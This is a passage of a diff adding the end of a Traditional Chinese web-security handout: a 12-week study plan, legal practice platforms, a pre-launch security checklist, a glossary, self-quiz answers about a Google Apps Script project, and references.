+<h3 id="自我測驗-6">自我測驗</h3>
+<ol><li><p><code>USER_DEPLOYING</code> 加 <code>ANYONE_ANONYMOUS</code> 為什麼危險？</p>
+</li><li><p>為什麼不能對 <code>PnL</code> 套用 <code>safeText_</code>，而是要解析成數字？</p>
+</li><li><p>在 GAS 中，哪一種函式不能被 <code>google.script.run</code> 呼叫？</p>
+</li></ol>
+<h2 id="12-週練習計畫與合法練習資源">12 週練習計畫與合法練習資源</h2>
+<p>每週投入 3 到 5 小時，大約 12 週可完成這份講義。時間不夠可以拉長，但不要跳過關卡。</p>
+<figure><svg viewBox="0 0 760 300" role="img" aria-label="12 週內先保護帳號，再學攻防，最後防護你的專案" font-size="13"><defs><marker id="plan-arrow" viewBox="0 0 10 10" refX="9" refY="5" markerWidth="6" markerHeight="6" orient="auto-start-reverse"><path d="M0 0L10 5L0 10z" fill="var(--muted)"/></marker></defs><text x="24" y="32" font-size="15" font-weight="600" fill="var(--ink)">12 週內先保護帳號，再學攻防，最後防護你的專案</text><g fill="none" stroke="var(--muted)" stroke-width="1.25"><path d="M184 124H200" marker-end="url(#plan-arrow)"/><path d="M360 124H376" marker-end="url(#plan-arrow)"/><path d="M536 124H552" marker-end="url(#plan-arrow)"/><path d="M24 224H712"/></g><g><rect x="24" y="56" width="160" height="136" rx="8" fill="var(--accent)" fill-opacity="0.12" stroke="var(--accent)" stroke-width="2"/><text x="36" y="80" font-weight="600" fill="var(--ink)">帳號與觀念</text><text x="36" y="100" font-size="11.5" fill="var(--muted)">第 1 至 2 週</text><text x="36" y="128" font-size="11.5" fill="var(--ink)">完成資產盤點</text><text x="36" y="148" font-size="11.5" fill="var(--ink)">帳號體檢與多因素</text><text x="36" y="168" font-size="11.5" fill="var(--ink)">密鑰外洩實作</text></g><g><rect x="200" y="56" width="160" height="136" rx="8" fill="none" fill-opacity="1" stroke="var(--muted)" stroke-width="1.25"/><text x="212" y="80" font-weight="600" fill="var(--ink)">網頁攻防</text><text x="212" y="100" font-size="11.5" fill="var(--muted)">第 3 至 6 週</text><text x="212" y="128" font-size="11.5" fill="var(--ink)">HTTP 與信任邊界</text><text x="212" y="148" font-size="11.5" fill="var(--ink)">本機三漏洞攻防</text><text x="212" y="168" font-size="11.5" fill="var(--ink)">PortSwigger 練習</text></g><g><rect x="376" y="56" width="160" height="136" rx="8" fill="none" fill-opacity="1" stroke="var(--muted)" stroke-width="1.25"/><text x="388" y="80" font-weight="600" fill="var(--ink)">打造你的專案</text><text x="388" y="100" font-size="11.5" fill="var(--muted)">第 7 至 9 週</text><text x="388" y="128" font-size="11.5" fill="var(--ink)">Private repo</text><text x="388" y="148" font-size="11.5" fill="var(--ink)">部署權限 MYSELF</text><text x="388" y="168" font-size="11.5" fill="var(--ink)">CSV 驗證與公式防護</text></g><g><rect x="552" y="56" width="160" height="136" rx="8" fill="none" fill-opacity="1" stroke="var(--muted)" stroke-width="1.25"/><text x="564" y="80" font-weight="600" fill="var(--ink)">攻擊與驗收</text><text x="564" y="100" font-size="11.5" fill="var(--muted)">第 10 至 12 週</text><text x="564" y="128" font-size="11.5" fill="var(--ink)">7.9 攻擊測試</text><text x="564" y="148" font-size="11.5" fill="var(--ink)">應變與還原演練</text><text x="564" y="168" font-size="11.5" fill="var(--ink)">Juice Shop 綜合題</text></g><g><path d="M192 216l8 8l-8 8l-8 -8z" fill="var(--muted)"/><text x="192" y="252" text-anchor="middle" font-size="11.5" font-weight="600" fill="var(--ink)">關卡 1</text><text x="192" y="270" text-anchor="middle" font-size="11.5" fill="var(--muted)">重要帳號已開多因素</text></g><g><path d="M368 216l8 8l-8 8l-8 -8z" fill="var(--muted)"/><text x="368" y="252" text-anchor="middle" font-size="11.5" font-weight="600" fill="var(--ink)">關卡 2</text><text x="368" y="270" text-anchor="middle" font-size="11.5" fill="var(--muted)">能自己修好三個漏洞</text></g><g><path d="M544 216l8 8l-8 8l-8 -8z" fill="var(--muted)"/><text x="544" y="252" text-anchor="middle" font-size="11.5" font-weight="600" fill="var(--ink)">關卡 3</text><text x="544" y="270" text-anchor="middle" font-size="11.5" fill="var(--muted)">其他帳號無法存取</text></g><g><path d="M704 216l8 8l-8 8l-8 -8z" fill="var(--muted)"/><text x="712" y="252" text-anchor="end" font-size="11.5" font-weight="600" fill="var(--ink)">完成</text><text x="712" y="270" text-anchor="end" font-size="11.5" fill="var(--muted)">7.9 測試全部通過</text></g></svg><figcaption>12 週學習路線 · 4 個階段與 4 道關卡</figcaption></figure>
+<p>每個階段結束時，先通過下方的關卡再往下走。第一階段不用寫程式，而且立刻就能降低風險。</p>
+<h3 id="第-1-階段帳號與觀念第-1-至-2-週">第 1 階段：帳號與觀念（第 1 至 2 週）</h3>
+<ul><li class="task"><label><input type="checkbox" data-task="23"><span>讀完第 1 課，修改資產盤點表</span></label></li><li class="task"><label><input type="checkbox" data-task="24"><span>讀完第 2 課，完成帳號體檢</span></label></li><li class="task"><label><input type="checkbox" data-task="25"><span>完成「刪掉不等於消失」實作</span></label></li><li class="task"><label><input type="checkbox" data-task="26"><span>做完第 1、2 課的自我測驗</span></label></li></ul>
+<h3 id="第-2-階段網頁攻防第-3-至-6-週">第 2 階段：網頁攻防（第 3 至 6 週）</h3>
+<ul><li class="task"><label><input type="checkbox" data-task="27"><span>完成第 3 課的繞過前端實作</span></label></li><li class="task"><label><input type="checkbox" data-task="28"><span>完成第 4 課的三個漏洞攻防</span></label></li><li class="task"><label><input type="checkbox" data-task="29"><span>PortSwigger：完成 Access control 的入門題</span></label></li><li class="task"><label><input type="checkbox" data-task="30"><span>PortSwigger：完成 SQL injection 的入門題</span></label></li><li class="task"><label><input type="checkbox" data-task="31"><span>PortSwigger：完成 XSS 的入門題</span></label></li><li class="task"><label><input type="checkbox" data-task="32"><span>PortSwigger：完成 CSRF 的入門題</span></label></li><li class="task"><label><input type="checkbox" data-task="33"><span>做完第 3、4 課的自我測驗</span></label></li></ul>
+<h3 id="第-3-階段打造-你的專案第-7-至-9-週">第 3 階段：打造你的專案（第 7 至 9 週）</h3>
+<ul><li class="task"><label><input type="checkbox" data-task="34"><span>讀完第 5 課，檢查工具鏈</span></label></li><li class="task"><label><input type="checkbox" data-task="35"><span>依 7.10 的順序建立 repo、測試工作表和部署設定</span></label></li><li class="task"><label><input type="checkbox" data-task="36"><span>實作 CSV 驗證和公式防護</span></label></li><li class="task"><label><input type="checkbox" data-task="37"><span>確認其他 Google 帳號無法存取</span></label></li></ul>
+<h3 id="第-4-階段攻擊與驗收第-10-至-12-週">第 4 階段：攻擊與驗收（第 10 至 12 週）</h3>
+<ul><li class="task"><label><input type="checkbox" data-task="38"><span>執行並填完 7.9 的攻擊測試表</span></label></li><li class="task"><label><input type="checkbox" data-task="39"><span>讀完第 6 課，完成應變演練</span></label></li><li class="task"><label><input type="checkbox" data-task="40"><span>完成上線前檢查清單</span></label></li><li class="task"><label><input type="checkbox" data-task="41"><span>在本機用 Juice Shop 做綜合練習</span></label></li><li class="task"><label><input type="checkbox" data-task="42"><span>寫一頁檢討：這次找到了什麼、修了什麼、下一步是什麼</span></label></li></ul>
+<h3 id="合法練習資源">合法練習資源</h3>
+<div class="table-wrap"><table><thead><tr><th>資源</th><th>適合做什麼</th><th>費用</th><th>適合時機</th></tr></thead><tbody><tr><td><a href="https://portswigger.net/web-security" target="_blank" rel="noopener">PortSwigger Web Security Academy</a></td><td>依主題練習網頁漏洞，部分實驗可搭配 Burp Suite Community</td><td>免費，需註冊才能記錄進度</td><td>第 4 課起</td></tr><tr><td><a href="https://github.com/juice-shop/juice-shop" target="_blank" rel="noopener">OWASP Juice Shop</a></td><td>在本機攻擊一個完整的不安全網站</td><td>開源</td><td>第 4 階段</td></tr><tr><td><a href="https://top10.owasp.org/2025" target="_blank" rel="noopener">OWASP Top 10:2025</a></td><td>了解主要網頁風險</td><td>免費</td><td>當地圖使用</td></tr><tr><td><a href="https://genai.owasp.org/llm-top-10/" target="_blank" rel="noopener">OWASP LLM Top 10</a></td><td>了解 AI 應用程式風險</td><td>免費</td><td>第 5 課起</td></tr><tr><td><a href="https://overthewire.org/wargames/bandit/" target="_blank" rel="noopener">OverTheWire Bandit</a></td><td>給新手的指令列與基礎闖關</td><td>免費</td><td>想補基礎時</td></tr><tr><td><a href="https://tryhackme.com/" target="_blank" rel="noopener">TryHackMe</a></td><td>有引導的入門路徑</td><td>有免費方案，部分內容可能付費</td><td>完成本講義後</td></tr><tr><td><a href="https://picoctf.org/" target="_blank" rel="noopener">picoCTF／CyLab Security Academy</a></td><td>學習並參加 CTF 解題</td><td>免費</td><td>完成本講義後</td></tr></tbody></table></div>
+<p>Juice Shop 可用 Docker 執行。<code>127.0.0.1</code> 代表只綁定本機，請不要移除：</p>
+<pre><code class="language-bash">docker run --rm -p 127.0.0.1:3000:3000 bkimminich/juice-shop</code></pre>
+<p><strong>不確定是否合法時就不要測。</strong> 只攻擊這些平台明確提供的練習目標。不要把它們的官方網站或其他使用者的機器當作目標。</p>
+<h2 id="上線前檢查清單">上線前檢查清單</h2>
+<p>每次有專案要上線，都可以重複使用這份清單。如果有一項回答不出來，就是下一個要處理的地方。</p>
+<p><strong>帳號與憑證</strong></p>
+<ul><li class="task"><label><input type="checkbox" data-task="43"><span>Email、GitHub 和部署平台都已開啟多因素驗證</span></label></li><li class="task"><label><input type="checkbox" data-task="44"><span>每個重要帳號都使用不同密碼</span></label></li><li class="task"><label><input type="checkbox" data-task="45"><span>備援碼已離線保存</span></label></li><li class="task"><label><input type="checkbox" data-task="46"><span>沒有不認得的 OAuth 授權、Token 或 SSH 金鑰</span></label></li></ul>
+<p><strong>程式碼與 repo</strong></p>
+<ul><li class="task"><label><input type="checkbox" data-task="47"><span>Repo 的公開程度是刻意決定的</span></label></li><li class="task"><label><input type="checkbox" data-task="48"><span>.gitignore 已排除憑證、真實資料和產出檔</span></label></li><li class="task"><label><input type="checkbox" data-task="49"><span>密鑰掃描已涵蓋整個 Git 歷史</span></label></li><li class="task"><label><input type="checkbox" data-task="50"><span>已檢查相依套件的漏洞，並提交鎖定檔</span></label></li><li class="task"><label><input type="checkbox" data-task="51"><span>AI 產生的程式已被人工看過，套件也已查證</span></label></li></ul>
+<p><strong>權限與輸入</strong></p>
+<ul><li class="task"><label><input type="checkbox" data-task="52"><span>每個入口都在伺服器端檢查權限</span></label></li><li class="task"><label><input type="checkbox" data-task="53"><span>用兩個測試帳號驗證過無法存取對方資料</span></label></li><li class="task"><label><input type="checkbox" data-task="54"><span>後端都有驗證型別、範圍、長度和允許清單</span></label></li><li class="task"><label><input type="checkbox" data-task="55"><span>資料庫查詢都使用參數化</span></label></li><li class="task"><label><input type="checkbox" data-task="56"><span>輸出到 HTML 時有依情境編碼</span></label></li><li class="task"><label><input type="checkbox" data-task="57"><span>寫入試算表前有處理公式注入</span></label></li><li class="task"><label><input type="checkbox" data-task="58"><span>改變狀態的操作有防 CSRF，且不使用 GET</span></label></li><li class="task"><label><input type="checkbox" data-task="59"><span>上傳有限制大小、類型，並實際檢查內容</span></label></li></ul>
+<p><strong>部署與資料</strong></p>
+<ul><li class="task"><label><input type="checkbox" data-task="60"><span>沒有使用預設密碼、除錯模式或公開管理頁</span></label></li><li class="task"><label><input type="checkbox" data-task="61"><span>錯誤訊息不包含堆疊、路徑或機密資料</span></label></li><li class="task"><label><input type="checkbox" data-task="62"><span>內容都透過 HTTPS 傳輸</span></label></li><li class="task"><label><input type="checkbox" data-task="63"><span>只收集必要資料，分享權限也已收緊</span></label></li><li class="task"><label><input type="checkbox" data-task="64"><span>用不到的功能、端點、舊部署都已關閉</span></label></li></ul>
+<p><strong>偵測與復原</strong></p>
+<ul><li class="task"><label><input type="checkbox" data-task="65"><span>有記錄重要操作和失敗事件，而且沒有記錄密鑰</span></label></li><li class="task"><label><input type="checkbox" data-task="66"><span>有離線備份，且已實際還原過</span></label></li><li class="task"><label><input type="checkbox" data-task="67"><span>知道金鑰外洩、帳號被盜時的處理順序</span></label></li></ul>
+<h2 id="名詞對照表">名詞對照表</h2>
+<div class="table-wrap"><table><thead><tr><th>名詞</th><th>中文</th><th>一句話解釋</th></tr></thead><tbody><tr><td>Access Control</td><td>權限控管</td><td>決定誰能對什麼資源做什麼</td></tr><tr><td>Allowlist</td><td>允許清單</td><td>只接受明確列出的內容</td></tr><tr><td>Attack Surface</td><td>攻擊面</td><td>攻擊者能接觸到的所有入口</td></tr><tr><td>Authentication</td><td>驗證</td><td>確認你是誰</td></tr><tr><td>Authorization</td><td>授權</td><td>確認你可以做什麼</td></tr><tr><td>CORS</td><td>跨來源資源共用</td><td>放寬同源限制的機制</td></tr><tr><td>Credential Stuffing</td><td>撞庫</td><td>用外洩帳密到其他網站嘗試登入</td></tr><tr><td>CSP</td><td>內容安全政策</td><td>限制頁面可載入和執行的內容</td></tr><tr><td>CSRF</td><td>跨站請求偽造</td><td>騙瀏覽器帶著登入狀態送出請求</td></tr><tr><td>CTF</td><td>奪旗賽</td><td>在合法題目中找出隱藏的標記</td></tr><tr><td>Defense in Depth</td><td>縱深防禦</td><td>多層防線，避免單點失效</td></tr><tr><td>Exploit</td><td>攻擊手法</td><td>利用弱點的實際做法</td></tr><tr><td>Formula Injection</td><td>公式注入</td><td>文字被試算表當成公式執行</td></tr><tr><td>IDOR</td><td>不安全的物件參照</td><td>改 id 就能碰到別人的資料</td></tr><tr><td>Infostealer</td><td>竊密木馬</td><td>偷密碼和登入 Cookie 的惡意程式</td></tr><tr><td>Injection</td><td>注入</td><td>資料被當成指令執行</td></tr><tr><td>Least Privilege</td><td>最小權限</td><td>只給必要權限</td></tr><tr><td>MFA</td><td>多因素驗證</td><td>除了密碼，還需要其他證明</td></tr><tr><td>OAuth</td><td>開放授權</td><td>讓應用程式取得部分帳號權限</td></tr><tr><td>Passkey</td><td>通行金鑰</td><td>不用密碼、綁定網域的登入方式</td></tr><tr><td>Phishing</td><td>釣魚</td><td>假冒可信對象騙取資料或操作</td></tr><tr><td>Prompt Injection</td><td>提示注入</td><td>內容誤導 AI 執行不該做的事</td></tr><tr><td>Same-Origin Policy</td><td>同源政策</td><td>限制網站讀取其他來源的回應</td></tr><tr><td>Session</td><td>工作階段</td><td>登入後伺服器記得你的狀態</td></tr><tr><td>SQL Injection</td><td>SQL 注入</td><td>輸入改變了資料庫查詢</td></tr><tr><td>SSRF</td><td>伺服器端請求偽造</td><td>叫伺服器去連攻擊者指定的位址</td></tr><tr><td>Supply Chain Attack</td><td>供應鏈攻擊</td><td>透過你依賴的套件或工具入侵</td></tr><tr><td>Threat Modeling</td><td>威脅建模</td><td>動手前有系統地找出風險</td></tr><tr><td>Trust Boundary</td><td>信任邊界</td><td>資料從不可控進入可控的那條線</td></tr><tr><td>XSS</td><td>跨站腳本</td><td>資料被瀏覽器當成程式執行</td></tr></tbody></table></div>
+<h2 id="自我測驗解答">自我測驗解答</h2>
+<p><strong>第 1 課</strong></p>
+<ol><li><p>主要是授權問題。系統知道你是誰，卻沒檢查你能否碰這筆資料。</p>
+</li><li><p>攻擊者可能已留下 OAuth 授權、轉寄規則、其他裝置的工作階段或設定。</p>
+</li><li><p>網址可能洩漏，而且拿到網址的人依然不會被檢查權限。</p>
+</li></ol>
+<p><strong>第 2 課</strong></p>
+<ol><li><p>通行金鑰綁定真實網域，在假網站無法使用。六位數驗證碼則可能被你手動輸入到假網站。</p>
+</li><li><p>立刻撕銷那個 Token，接著才查紀錄、清除歷史。</p>
+</li><li><p>否。鎖頭只代表連線加密且憑證符合該網域，釣魚網站也能取得憑證。</p>
+</li></ol>
+<p><strong>第 3 課</strong></p>
+<ol><li><p>不能。使用者仍可直接送出請求，API 必須在後端檢查權限。</p>
+</li><li><p>需要。CORS 主要是瀏覽器執行的規則，直接呼叫 API 的工具不受限制。</p>
+</li><li><p>允許清單只接受已知合法的內容。封鎖清單則要猜到所有攻擊寫法，很容易遺漏。</p>
+</li></ol>
+<p><strong>第 4 課</strong></p>
+<ol><li><p>沒有。亂數只是增加猜測難度，id 外洩後仍能存取。必須檢查擁有者或權限。</p>
+</li><li><p>參數化查詢讓資料庫區分指令和資料，從結構上處理問題。過濾則容易漏掉變形寫法。</p>
+</li><li><p>不是。腳本雖然讀不到 Cookie，仍可以在頁面中以受害者身分發請求、讀取內容。</p>
+</li><li><p>通常不能。同源政策會限制讀取回應，但請求造成的修改仍可能生效。</p>
+</li></ol>
+<p><strong>第 5 課</strong></p>
+<ol><li><p>不代表。它只檢查已知漏洞，擋不住全新或尚未通報的惡意套件。</p>
+</li><li><p>因為網頁內容由外部控制，可能藏有指令，而模型無法可靠區分指令和資料。</p>
+</li><li><p>能讀私人資料、會接觸不可信內容、能對外傳送資料。</p>
+</li></ol>
+<p><strong>第 6 課</strong></p>
+<ol><li><p>惡意程式可能偵測到新密碼，或偷走新的登入狀態。</p>
+</li><li><p>帳號被盜時，攻擊者可能同時刪除或修改同一個帳號裡的原檔和副本。</p>
+</li><li><p>能讀日誌的人會直接取得有效憑證，而日誌通常保存很久、分流也很廣。</p>
+</li></ol>
+<p><strong>第 7 課</strong></p>
+<ol><li><p>任何拿到網址的人都不必登入，就能以你的權限執行程式。</p>
+</li><li><p>負數是合法的損益，如果套用 <code>safeText_</code>，就會變成文字並影響計算。解析成數字則同時保留計算能力，也能拒絕公式。</p>
+</li><li><p>名稱以底線結尾的私有函式，以及非頂層的函式。</p>
+</li></ol>
+<h2 id="驗證範圍與參考資料">驗證範圍與參考資料</h2>
+<p><strong>已實際測試：</strong> 第 3 課與第 4 課的 Python 練習程式、攻擊指令與修補。第 7 課的 CSV 驗證程式已在 Node.js 中用模擬的 CSV 解析器測試，成功通過你的 493 筆 <code>trades_export.csv</code>，也拒絕了範例中的錯誤資料。</p>
+<p><strong>尚未測試：</strong> 第 7 課的程式尚未在真正的 GAS、Google 工作表和實際部署中執行。部署權限、授權範圍和公式防護都要用 7.9 實測。你的 Google 和交易平台帳號設定也尚未檢查。</p>
+<p>法律說明只是一般概念，不是法律意見。遇到實際案件時，請詢問專業律師。</p>
+<p><strong>參考資料（查閱於 2026 年 11 月 5 日）：</strong></p>
+<ul><li><p><a href="https://top10.owasp.org/2025" target="_blank" rel="noopener">OWASP Top 10:2025</a></p>
+</li><li><p><a href="https://genai.owasp.org/llm-top-10/" target="_blank" rel="noopener">OWASP Top 10 for LLM Applications 2025</a></p>
+</li><li><p><a href="https://community.owasp.org/attacks/CSV_Injection" target="_blank" rel="noopener">OWASP CSV Injection</a></p>
+</li><li><p><a href="https://cheatsheetseries.owasp.org/" target="_blank" rel="noopener">OWASP Cheat Sheet Series</a>：遇到具體實作問題時可查的安全指南</p>
+</li><li><p><a href="https://developers.google.com/apps-script/guides/web" target="_blank" rel="noopener">Google：Apps Script 網頁應用程式</a></p>
+</li><li><p><a href="https://developers.google.com/apps-script/manifest/web-app-api-executable" target="_blank" rel="noopener">Google：網頁應用程式資訊清單設定</a></p>
+</li><li><p><a href="https://developers.google.com/apps-script/guides/html/communication" target="_blank" rel="noopener">Google：HTML 服務與伺服器溝通</a></p>
+</li><li><p><a href="https://developers.google.com/apps-script/guides/html/templates" target="_blank" rel="noopener">Google：HTML 範本</a></p>
+</li><li><p><a href="https://developers.google.com/apps-script/concepts/scopes" target="_blank" rel="noopener">Google：OAuth 範圍</a></p>
+</li><li><p><a href="https://developers.google.com/apps-script/guides/services/authorization" target="_blank" rel="noopener">Google：授權與 OnlyCurrentDoc</a></p>
+</li><li><p><a href="https://github.com/gitleaks/gitleaks" target="_blank" rel="noopener">gitleaks</a></p>
+</li><li><p><a href="https://haveibeenpwned.com/" target="_blank" rel="noopener">Have I Been Pwned</a></p>
+</li><li><p><a href="https://law.moj.gov.tw/LawClass/LawSingle.aspx?pcode=C0000001&amp;flno=358" target="_blank" rel="noopener">中華民國刑法第 358 條</a></p>
+</li></ul>
+<a class="to-top" href="#top">↑ 回到頂端</a>
+  </main>
+</div>
+<script src="../assets/doc.js"></script>
+</body>
+</html>
